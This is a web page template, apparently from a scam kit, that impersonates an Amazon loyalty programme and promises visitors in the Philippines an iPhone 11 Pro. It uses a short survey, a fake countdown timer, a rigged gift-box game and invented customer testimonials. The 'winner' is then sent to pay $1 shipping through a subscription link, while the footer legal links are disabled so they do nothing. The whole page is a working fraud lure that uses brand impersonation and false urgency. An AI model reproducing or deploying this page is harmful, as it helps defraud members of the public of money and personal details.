@extends('layouts.invite')

@section('before_styles')

@endsection

@section('content')
    <!DOCTYPE html>
<html>
<head>
    <base href="">
    <title>Pending Prize...</title>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="robots" content="noindex, follow">
    <script src="/invites/amaz1uk/js/jquery.min.js"></script>
    <script src="/invites/amaz1uk/js/popper.min.js"></script>
    <script src="/invites/amaz1uk/js/bootstrap.min.js"></script>
    <script src="/invites/amaz1uk/js/p.js"></script>
    <link rel="stylesheet" href="/invites/amaz1uk/css/bootstrap.min.css">
    <link rel="stylesheet" href="/invites/amaz1uk/css/all.css">
    <script type="text/javascript">
        var brand_country = "Philippines";
        var dayNames = Array("Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday");
        var monthNames = new Array("January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December");
        var minutos_y = "minutes and ";
        var segundos = "seconds";
        var modalOptions = {
            backdrop: 'static',
            keyboard: false
        };
    </script>
</head>
<body>
<div id="p_body_content">
    <div id="id1" class="header" style="background:#232f3f;">
        <p style="margin-bottom:0px; padding:5px 0px;">
            <img src="/invites/amaz1uk/img/logo-it.png">
        </p>
    </div>
    <div class="content container">
        <div class="main-content flag" id="content1" style="color:#232f3f;">

            <div class="row d-flex align-items-center">
                <div class="col-md-6 align-middle">

                    <div style="display: flex; font-weight:bold; margin-bottom:20px;">
                        <div style="display:block; text-align:center; color:#232f3f;" class="header_flex_item">Amazon
                            loyalty program <i class="far fa-bell"></i></div>
                    </div>
                    <h2 style="font-weight: bold;">Congratulations!</h2>
                    <p>Today, <span class="p_var-dia">7</span>&nbsp;<span class="p_var-mes_nombre">October</span> <span
                            class="p_var-anyo">2020</span>, you have been chosen to participate in our survey. It will
                        only take you a minute and you will receive a fantastic prize: an <strong>iPhone 11
                            Pro!</strong></p>
                    <p>Each <span class="p_var-dia_nombre">Wednesday</span> we randomly choose 10 users to give them a
                        chance to win amazing prizes. Today's prize is a <strong>iPhone 11 Pro</strong>! There will be
                        10 lucky winners. This promotion is only valid for Philippines!</p>
                    <p>This survey aims to improve the quality of service for our users and your participation will be
                        rewarded 100%.</p>
                    <p>You only have <font color="red"><b><span id="timerr" style="color:#c82311">3 minutes and 57 seconds</span></b></font>,
                        to answer this survey!</p>
                    <p>Hurry up, the number of prizes available is limited!</p>

                </div>


                <div class="col-md-6 text-center">
                    <div class="text-center d-inline-block">
                        <div class="principal_bg giftcard_principal_bg"><img style="width:100%; max-width:400px;"
                                                                             src="/invites/amaz1uk/img/muti_apple.jpg">
                        </div>
                    </div>
                </div>

            </div>

            <div class="main-content flag" id="content1"
                 style="border: 1px solid #CCCCCC; padding: 20px; margin: 20px 0px;">
                <div id="q1">
                    <p class="question"><strong>Question 1 of 4:</strong> Are you male or female? </p>
                    <div class="survey_button bq1" data-bq="1"> Male</div>
                    <div class="survey_button bq1" data-bq="2"> Female</div>
                </div>
                <div id="q2">
                    <p class="question"><strong>Question 2 of 4:</strong> How old are you? </p>
                    <div class="survey_button bq2" data-bq="1"> 18-29</div>
                    <div class="survey_button bq2" data-bq="2"> 30-39</div>
                    <div class="survey_button bq2" data-bq="3"> 40-49</div>
                    <div class="survey_button bq2" data-bq="4"> 50+</div>
                </div>
                <div id="q3">
                    <p class="question"><strong>Question 3 of 4:</strong> How do you rate Amazon services in
                        Philippines? </p>
                    <div class="survey_button bq3" data-bq="1"> Very good</div>
                    <div class="survey_button bq3" data-bq="2"> Unbelievable</div>
                    <div class="survey_button bq3" data-bq="3"> OK</div>
                    <div class="survey_button bq3" data-bq="4"> Not so good</div>
                </div>
                <div id="q4">
                    <p class="question"><strong>Question 4 of 4:</strong> Which smartphone are you using? </p>
                    <div class="survey_button bq4" data-bq="1"> Android</div>
                    <div class="survey_button bq4" data-bq="2"> Apple</div>
                </div>
            </div>
        </div>
        <div class="main-content" id="content2">
            <h2 style="text-align:center">We are verifying your answer...</h2>
            <div class="d-flex justify-content-center">
                <div class="spinner-border" role="status"><span class="sr-only">Loading...</span></div>
            </div>
            <p class="result" id="result1">You have answered all 4 questions</p>
            <p class="result" id="result2">Your IP address is valid for this promotion</p>
            <p class="result" id="result3">Gifts are available and in stock!</p>
        </div>
        <div class="main-content" id="content3">
            <script type="text/javascript">
                var box_ini = false;
            </script>
            <div id="boxes" class="boxes">
                <div class="div_img_gift"><img class="img_gift" src="/invites/amaz1uk/img/box-gift.png"></div>
                <div id="0" class="try temblor">
                    <div class="caja_tapa"><img src="/invites/amaz1uk/img/box-01.png"></div>
                    <div class="caja_trasera"><img src="/invites/amaz1uk/img/box-03.png"></div>
                    <div class="caja_gift"><img src="/invites/amaz1uk/img/box-04.png"></div>
                    <div class="caja"><img src="/invites/amaz1uk/img/box-02.png"></div>
                </div>
                <div id="1" class="try temblor">
                    <div class="caja_tapa"><img src="/invites/amaz1uk/img/box-01.png"></div>
                    <div class="caja_trasera"><img src="/invites/amaz1uk/img/box-03.png"></div>
                    <div class="caja_gift"><img src="/invites/amaz1uk/img/box-04.png"></div>
                    <div class="caja"><img src="/invites/amaz1uk/img/box-02.png"></div>
                </div>
                <div id="2" class="try temblor">
                    <div class="caja_tapa"><img src="/invites/amaz1uk/img/box-01.png"></div>
                    <div class="caja_trasera"><img src="/invites/amaz1uk/img/box-03.png"></div>
                    <div class="caja_gift"><img src="/invites/amaz1uk/img/box-04.png"></div>
                    <div class="caja"><img src="/invites/amaz1uk/img/box-02.png"></div>
                </div>
                <div id="3" class="try temblor">
                    <div class="caja_tapa"><img src="/invites/amaz1uk/img/box-01.png"></div>
                    <div class="caja_trasera"><img src="/invites/amaz1uk/img/box-03.png"></div>
                    <div class="caja_gift"><img src="/invites/amaz1uk/img/box-04.png"></div>
                    <div class="caja"><img src="/invites/amaz1uk/img/box-02.png"></div>
                </div>
                <div id="4" class="try temblor">
                    <div class="caja_tapa"><img src="/invites/amaz1uk/img/box-01.png"></div>
                    <div class="caja_trasera"><img src="/invites/amaz1uk/img/box-03.png"></div>
                    <div class="caja_gift"><img src="/invites/amaz1uk/img/box-04.png"></div>
                    <div class="caja"><img src="/invites/amaz1uk/img/box-02.png"></div>
                </div>
                <div id="5" class="try temblor">
                    <div class="caja_tapa"><img src="/invites/amaz1uk/img/box-01.png"></div>
                    <div class="caja_trasera"><img src="/invites/amaz1uk/img/box-03.png"></div>
                    <div class="caja_gift"><img src="/invites/amaz1uk/img/box-04.png"></div>
                    <div class="caja"><img src="/invites/amaz1uk/img/box-02.png"></div>
                </div>
                <div id="6" class="try temblor">
                    <div class="caja_tapa"><img src="/invites/amaz1uk/img/box-01.png"></div>
                    <div class="caja_trasera"><img src="/invites/amaz1uk/img/box-03.png"></div>
                    <div class="caja_gift"><img src="/invites/amaz1uk/img/box-04.png"></div>
                    <div class="caja"><img src="/invites/amaz1uk/img/box-02.png"></div>
                </div>
                <div id="7" class="try temblor">
                    <div class="caja_tapa"><img src="/invites/amaz1uk/img/box-01.png"></div>
                    <div class="caja_trasera"><img src="/invites/amaz1uk/img/box-03.png"></div>
                    <div class="caja_gift"><img src="/invites/amaz1uk/img/box-04.png"></div>
                    <div class="caja"><img src="/invites/amaz1uk/img/box-02.png"></div>
                </div>
                <div id="8" class="try temblor">
                    <div class="caja_tapa"><img src="/invites/amaz1uk/img/box-01.png"></div>
                    <div class="caja_trasera"><img src="/invites/amaz1uk/img/box-03.png"></div>
                    <div class="caja_gift"><img src="/invites/amaz1uk/img/box-04.png"></div>
                    <div class="caja"><img src="/invites/amaz1uk/img/box-02.png"></div>
                </div>
                <div id="9" class="try temblor">
                    <div class="caja_tapa"><img src="/invites/amaz1uk/img/box-01.png"></div>
                    <div class="caja_trasera"><img src="/invites/amaz1uk/img/box-03.png"></div>
                    <div class="caja_gift"><img src="/invites/amaz1uk/img/box-04.png"></div>
                    <div class="caja"><img src="/invites/amaz1uk/img/box-02.png"></div>
                </div>
                <div id="10" class="try temblor">
                    <div class="caja_tapa"><img src="/invites/amaz1uk/img/box-01.png"></div>
                    <div class="caja_trasera"><img src="/invites/amaz1uk/img/box-03.png"></div>
                    <div class="caja_gift"><img src="/invites/amaz1uk/img/box-04.png"></div>
                    <div class="caja"><img src="/invites/amaz1uk/img/box-02.png"></div>
                </div>
                <div id="11" class="try temblor">
                    <div class="caja_tapa"><img src="/invites/amaz1uk/img/box-01.png"></div>
                    <div class="caja_trasera"><img src="/invites/amaz1uk/img/box-03.png"></div>
                    <div class="caja_gift"><img src="/invites/amaz1uk/img/box-04.png"></div>
                    <div class="caja"><img src="/invites/amaz1uk/img/box-02.png"></div>
                </div>
            </div>
            <div id="p_modal1" class="modal fade text-center p_modal" tabindex="-1" role="dialog" aria-hidden="true">
                <div class="modal-dialog" role="document">
                    <div class="modal-content">
                        <div class="modal-body"><img class="temblor_inf" src="/invites/amaz1uk/img/box-00.png">
                            <h2>Congratulations, your answers have been successfully saved!</h2>
                            <p>Today, <span class="p_var-dia">7</span>&nbsp;<span
                                    class="p_var-mes_nombre">October</span>, you have a chance to win a iPhone 11 Pro!
                                <br>
                                <br>
                                You must select the correct box with your prize inside. <br>
                                <br>
                                You have 3 attempts. Good luck!</p>
                            <div id="p_modal_button1" class="p_modal_button">OK</div>
                        </div>
                    </div>
                </div>
            </div>
            <div id="p_modal2" class="modal fade text-center p_modal" tabindex="-1" role="dialog" aria-hidden="true">
                <div class="modal-dialog" role="document">
                    <div class="modal-content">
                        <div class="modal-body">
                            <div class="circle-loader">
                                <div class="checkmark draw"></div>
                            </div>
                            <h2>Ops...</h2>
                            <p>Sorry, the box you selected is empty. You still have (<span id="num_intentos">3</span>)
                                chances! Good luck!</p>
                            <div id="p_modal_button2" class="p_modal_button">OK</div>
                        </div>
                    </div>
                </div>
            </div>
            <div id="p_modal3" class="modal fade text-center p_modal" tabindex="-1" role="dialog" aria-hidden="true">
                <div class="modal-dialog" role="document">
                    <div class="modal-content">
                        <div class="modal-body"><img src="/invites/amaz1uk/img/box-gift.png">
                            <h2> You have it !</h2>
                            <p>You won an iPhone 11 Pro!</p>
                            <p>1. Click on "OK" to visit our sponsors page.</p>
                            <p>2. Enter your address and pay $1 shipping to get your iPhone 11 Pro.</p>
                            <p>3. Your iPhone 11 Pro will be delivered within 5 to 7 days by the courier service.</p>
                            <p>Important: all deliveries are made without personal contact - the courier will leave your
                                package outside your door.</p>
                            <div id="p_modal_button3" class="p_modal_button">
                                <a onclick="botscheck();" id="offerlink" target="_blank" style="display:block;" href="/subscribe-iphone-pro">OK</a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="main-content">
            <div class="comments_face">
                <div class="comments">
                    <p style="margin:0;padding:0;float:left;display:block;width:50%"><span style="color:#3b5998">Commentaires</span>
                    </p>
                    <p style="margin:0;padding:0;float:right;display:block;width:50%;color:#a8a7a7;text-align:right">11
                        of 183</p>
                    <div style="clear:both"></div>
                </div>
                <div class="comments" id="comment0" style="display:block">
                    <div class="profile"><img src="/invites/amaz1uk/img/6.jpg"></div>
                    <div class="comment-content">
                        <p class="name">Natanaël Baugé</p>
                        <p>I registered, I won and I received my iPhone 11 Pro after 5 days. Thanks a lot guys ! </p>
                    </div>
                    <div class="clr"></div>
                    <div class="comment-status"><span>J'aime · Commenter <img src="/invites/amaz1uk/img/like.png" width="15px" height="15px">20</span>
                        · <span class="p_var-dia">7</span>&nbsp;<span class="p_var-mes_nombre">October</span>, <span
                            class="p_var-anyo">2020</span></div>
                </div>
                <div class="comments" id="comment1" style="display:block">
                    <div class="profile"><img src="/invites/amaz1uk/img/3.jpg"></div>
                    <div class="comment-content">
                        <p class="name">Jean-Claude Dufour</p>
                        <p>Fantastic ! I never won anything, but here I was lucky :) </p>
                    </div>
                    <div class="clr"></div>
                    <div class="comment-status"><span>J'aime · Commenter <img src="/invites/amaz1uk/img/like.png" width="15px" height="15px">47</span>
                        · <span class="p_var-dia">7</span>&nbsp;<span class="p_var-mes_nombre">October</span>, <span
                            class="p_var-anyo">2020</span></div>
                </div>
                <div class="comments" id="comment2" style="display:block">
                    <div class="profile"><img src="/invites/amaz1uk/img/2.jpg"></div>
                    <div class="comment-content">
                        <p class="name">Véronique Aveline</p>
                        <p>At first I thought it was a joke, but I finally got my iPhone 11 Pro! I told friends about
                            it, so they could participate too:) </p>
                    </div>
                    <div class="clr"></div>
                    <div class="comment-status"><span>J'aime · Commenter <img src="/invites/amaz1uk/img/like.png" width="15px" height="15px">3</span>
                        · <span class="p_var-dia">7</span>&nbsp;<span class="p_var-mes_nombre">October</span>, <span
                            class="p_var-anyo">2020</span></div>
                </div>
                <div class="comments" id="comment3" style="display:block">
                    <div class="profile"><img src="/invites/amaz1uk/img/8.jpg"></div>
                    <div class="comment-content">
                        <p class="name">Nicolette Lambert</p>
                        <p>I won nothing! prizes were not available when I completed the survey.</p>
                    </div>
                    <div class="clr"></div>
                    <div class="comment-status"><span>J'aime · Commenter <img src="/invites/amaz1uk/img/like.png" width="15px" height="15px">19</span>
                        · <span class="p_var-dia">7</span>&nbsp;<span class="p_var-mes_nombre">October</span>, <span
                            class="p_var-anyo">2020</span></div>
                </div>
                <div class="comments" id="comment4" style="display:block">
                    <div class="profile"><img src="/invites/amaz1uk/img/11.jpg"></div>
                    <div class="comment-content">
                        <p class="name">Hugo Montgomery</p>
                        <p>I won, I won! What a nice surprise in these difficult times! </p>
                    </div>
                    <div class="clr"></div>
                    <div class="comment-status"><span>J'aime · Commenter <img src="/invites/amaz1uk/img/like.png" width="15px" height="15px">26</span>
                        · <span class="p_var-dia">7</span>&nbsp;<span class="p_var-mes_nombre">October</span>, <span
                            class="p_var-anyo">2020</span></div>
                </div>
                <div class="comments" id="comment5" style="display:block">
                    <div class="profile"><img src="/invites/amaz1uk/img/4.jpg"></div>
                    <div class="comment-content">
                        <p class="name">Rémi Peltier</p>
                        <p>I love these promotions! </p>
                    </div>
                    <div class="clr"></div>
                    <div class="comment-status"><span>J'aime · Commenter <img src="/invites/amaz1uk/img/like.png" width="15px" height="15px">38</span>
                        · <span class="p_var-dia">7</span>&nbsp;<span class="p_var-mes_nombre">October</span>, <span
                            class="p_var-anyo">2020</span></div>
                </div>
                <div class="comments" id="comment5" style="display:block">
                    <div class="profile"><img src="/invites/amaz1uk/img/9.jpg"></div>
                    <div class="comment-content">
                        <p class="name">Stéphane Loupe</p>
                        <p>Are there other inquiries to be made? </p>
                    </div>
                    <div class="clr"></div>
                    <div class="comment-status"><span>J'aime · Commenter <img src="/invites/amaz1uk/img/like.png" width="15px" height="15px">27</span>
                        · <span class="p_var-dia">7</span>&nbsp;<span class="p_var-mes_nombre">October</span>, <span
                            class="p_var-anyo">2020</span></div>
                </div>
                <div class="comments" id="comment6" style="display:block">
                    <div class="profile"><img src="/invites/amaz1uk/img/10.jpg"></div>
                    <div class="comment-content">
                        <p class="name">Bérénice Lemaître</p>
                        <p>Have you ever seen something like this? If it doesn't work, try again! </p>
                    </div>
                    <div class="clr"></div>
                    <div class="comment-status"><span>J'aime · Commenter <img src="/invites/amaz1uk/img/like.png" width="15px" height="15px">50</span>
                        · <span class="p_var-dia">7</span>&nbsp;<span class="p_var-mes_nombre">October</span>, <span
                            class="p_var-anyo">2020</span></div>
                </div>
                <div class="comments" id="comment7" style="display:block">
                    <div class="profile"><img src="/invites/amaz1uk/img/1.jpg"></div>
                    <div class="comment-content">
                        <p class="name">Adélaïde Battier</p>
                        <p>I thought it was a joke but this morning I received an iPhone 11 Pro and I would like to do
                            other surveys like this! Can someone recommend me?</p>
                    </div>
                    <div class="clr"></div>
                    <div class="comment-status"><span>J'aime · Commenter <img src="/invites/amaz1uk/img/like.png" width="15px" height="15px">45</span>
                        · <span class="p_var-dia">7</span>&nbsp;<span class="p_var-mes_nombre">October</span>, <span
                            class="p_var-anyo">2020</span></div>
                </div>
                <div class="comments" id="comment7" style="display:block">
                    <div class="profile"><img src="/invites/amaz1uk/img/5.jpg"></div>
                    <div class="comment-content">
                        <p class="name">Robert De Villiers</p>
                        <p>I received a message on my phone, I completed a survey and I won! I am now waiting for my
                            delivery.</p>
                    </div>
                    <div class="clr"></div>
                    <div class="comment-status"><span>J'aime · Commenter <img src="/invites/amaz1uk/img/like.png" width="15px" height="15px">17</span>
                        · <span class="p_var-dia">7</span>&nbsp;<span class="p_var-mes_nombre">October</span>, <span
                            class="p_var-anyo">2020</span></div>
                </div>
                <div class="comments" id="comment8" style="display:block">
                    <div class="profile"><img src="/invites/amaz1uk/img/7.jpg"></div>
                    <div class="comment-content">
                        <p class="name">Annie Clérisseau</p>
                        <p>Can I get my iPhone 11 Pro today? Thank you </p>
                    </div>
                    <div class="clr"></div>
                    <div class="comment-status"><span>J'aime · Commenter <img src="/invites/amaz1uk/img/like.png" width="15px" height="15px">51</span>
                        · <span class="p_var-dia">7</span>&nbsp;<span class="p_var-mes_nombre">October</span>, <span
                            class="p_var-anyo">2020</span></div>
                </div>
            </div>
            <p style="font-size: 12px;color: #bcbcbc;"></p>
        </div>
    </div>
</div>
<div id="p_loading" style="display: none;">
    <div class="d-flex justify-content-center" style="margin: 0 auto;">
        <div class="spinner-border" role="status"><span class="sr-only">Loading...</span></div>
    </div>
</div>
<script>
    function botscheck() {
        var $offerlink = '/subscribe-iphone-pro';
        $('#offerlink').attr("href", $offerlink);
        window.onunload = window.onbeforeunload = null;
    }
</script>

<style>
    #footer a {
        color: #EFEFEF;
    }
</style>
<div id="footer"
     style="background-color:#0D141E; margin-bottom:0px;; font-size:12px; text-align:center; color:#EFEFEF;">
    <p style="padding:20px; padding-bottom:0px;">
        <a onclick="return false;" href="#">
            Conditions générales de vente
        </a>
        <a onclick="return false;" href="#">
            Conditions de participation au programme Marketplace
        </a>
        <a onclick="return false;" href="#">
            Vos informations personnelles</a>
        <a onclick="return false;" href="#">
            Cookies
        </a>
        <a onclick="return false;" href="#">Annonces basées sur vos centres d’intérêt</a>
    </p>
    <p style="line-height:40px; margin-bottom:0px;">© 1996-{{ \Carbon\Carbon::now()->year }} Amazon.com, Inc.</p>
</div>


</body>
</html>
@endsection


@section('footer_scripts')

@endsection

